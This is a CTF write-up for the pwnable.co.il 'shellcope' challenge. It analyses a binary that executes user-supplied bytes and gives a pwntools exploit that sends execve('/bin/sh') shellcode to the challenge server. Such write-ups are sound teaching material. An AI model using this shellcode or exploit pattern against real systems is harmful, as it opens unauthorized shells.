---
title: "pwnable.co.il - shellcope"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/pwnable.co.il/logo.png
ribbon: green
description: "Shellcode customize challenge."
categories:
  - CTF Writeups
  - pwn
---

> Challenge description:
>
> I just learned how to write shellcode!
> But i'm not sure where to store things if i don't have a stack... 

### Protections:
<pre>    
    Arch:       amd64-64-little
    RELRO:      <font color="#49FF6D">Full RELRO</font>
    Stack:      <font color="#FF3C3C">No canary found</font>
    NX:         <font color="#49FF6D">NX enabled</font>
    PIE:        <font color="#49FF6D">PIE enabled</font>
    SHSTK:      <font color="#49FF6D">Enabled</font>
    IBT:        <font color="#49FF6D">Enabled</font>
    Stripped:   <font color="#FF3C3C">No</font>
</pre>

Dump of the decompiled main function:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *dest; // [rsp+8h] [rbp-8h]

  dest = (char *)mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
  strcpy(dest, reset_shellcodes);
  fgets(dest + 48, 4047, stdin);
  mprotect(dest, 0x1000uLL, 5);
  ((void (*)(void))dest)();
  return 0;
}
```

`reset_shellcodes` points to a sequence of opcodes stored in the `.data` section:

[![static symbols](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)

The main function maps a 0x1000 bytes (page size - 4096 in decimal) using `mmap()`, copies the predefined opcodes from `reset_shellcodes` into that page using `strcpy()`, 
then reads up to `4047` bytes from `stdin` into the page starting at offset 48 (appending the user provided instructions). 
It then calls `mprotect()` to set the page permissions to `read + execute` and finally jumps to the mapped page to run the combined shellcodes.

## Exploit
```python
from pwn import *

def main():
    ### context ###
    context.arch = 'amd64'  # Ensure 64-bit architecture

    ### run ###
    #p = process("./shellcope")
    p = remote("pwnable.co.il", 9001)

    ### payload start ###
    shellcode = """
    jmp code

    shell:
        .ascii "/bin/sh\\x00"     

    code:
        xor rsi, rsi          
        xor rdx, rdx             
        lea rdi, [rip+shell]     
        mov al, 0x3b             
        syscall               
    """

    payload = asm(shellcode)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
```
